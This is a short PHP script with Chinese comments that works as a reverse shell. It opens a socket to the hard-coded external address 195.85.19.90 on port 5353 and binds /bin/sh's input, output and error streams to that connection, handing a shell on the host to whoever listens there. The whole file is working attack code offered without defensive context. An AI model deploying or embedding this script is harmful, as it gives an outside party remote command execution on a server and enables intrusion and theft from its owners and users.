<?php
$ip = '195.85.19.90';
$port = 5353;

// 方法1: 使用fsockopen + proc_open
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    exit("连接失败: $errstr ($errno)");
}

// 启动一个Shell进程并重定向输入/输出到Socket
$descriptors = array(
    0 => $sock,  // 标准输入
    1 => $sock,  // 标准输出
    2 => $sock   // 标准错误
);

$process = proc_open('/bin/sh', $descriptors, $pipes);
proc_close($process);
?>
